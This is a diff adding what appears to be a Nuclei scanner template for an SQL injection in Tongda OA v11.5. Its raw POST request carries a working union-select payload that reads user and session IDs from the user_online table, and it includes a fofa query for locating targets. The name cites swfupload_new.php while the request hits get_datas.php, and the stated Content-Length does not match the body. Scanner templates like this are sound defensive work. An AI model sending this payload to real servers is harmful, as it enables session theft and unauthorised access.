@@ -1,0 +1,35 @@
+id: tongda-get_datas-sqli
+
+info:
+  name: Tongda OA v11.5 swfupload_new.php - SQL Injection
+  author: SleepingBag945
+  severity: high
+  description: |
+    There is a SQL injection vulnerability in the swfupload_new.php file of Tongda OA v11.5. An attacker can obtain sensitive information of the server through the vulnerability.
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v11.5%20swfupload_new.php%20SQL注入漏洞.html
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/tongda-swfupload-new-sql-inject.yaml
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="TDXK-通达OA"
+  tags: tongda,sqli,intrusive,vuln
+
+http:
+  - raw:
+      - |
+        POST /general/reportshop/utils/get_datas.php HTTP/1.1
+        Host: {{HostName}}
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Length: 2
+
+        USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 where 1={`\='` 1} union (select uid,sid from user_online where 1\={`=` 1})-- '1**
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "1;11;"
+      - type: status
+        status:
+          - 200
